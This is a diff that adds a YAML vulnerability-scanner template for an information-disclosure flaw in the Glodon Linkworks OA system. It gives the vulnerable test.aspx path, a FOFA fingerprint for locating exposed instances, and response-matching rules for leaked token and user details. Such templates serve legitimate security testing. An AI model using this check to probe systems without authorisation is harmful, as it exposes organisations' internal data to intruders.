@@ -1,0 +1,16 @@
+id: poc-yaml-glodon-test-aspx-info-leak
+info:
+  name: 广联达OA test.aspx 信息泄露漏洞
+  severity: medium
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: 广联达 Linkworks办公OA
+  fofa: fid="/yV4r5PdARKT4jaqLjJYqw=="
+requests:
+- method: GET
+  path: /Services/Identification/Server/test.aspx
+  expression: status_code == 200 && contains(body,"token 过期时间设定") && contains(body,"用户为__")
+    && contains(body,"过期时间为") && contains(body,"aspNetHidden")
+variables: {}
+transport: http
